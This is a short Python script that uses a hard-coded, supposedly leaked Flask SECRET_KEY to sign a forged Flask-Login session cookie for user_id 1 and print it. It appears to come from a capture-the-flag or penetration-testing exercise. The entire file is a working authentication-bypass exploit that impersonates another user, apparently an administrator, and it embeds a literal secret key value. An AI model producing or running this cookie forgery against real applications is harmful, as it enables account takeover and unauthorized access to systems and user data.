from flask import Flask
import uuid

# Create Flask app with leaked SECRET_KEY
app = Flask(__name__)
app.config['SECRET_KEY'] = 'G7x7pMBBduHU0HH5avEQ'

# Create session payload for Flask-Login authentication
session_payload = {
    '_fresh': True,
    '_id': str(uuid.uuid4()),
    'user_id': 1,
    '_user_id': 1
}

# Get Flask's signing serializer (this is what Flask uses internally)
serializer = app.session_interface.get_signing_serializer(app)

# Generate the forged session cookie using Flask's secure serialization
forged_cookie = serializer.dumps(session_payload)

print(f"Generated forged session cookie:")
print(forged_cookie)
print(f"\nCookie payload structure: {session_payload}")
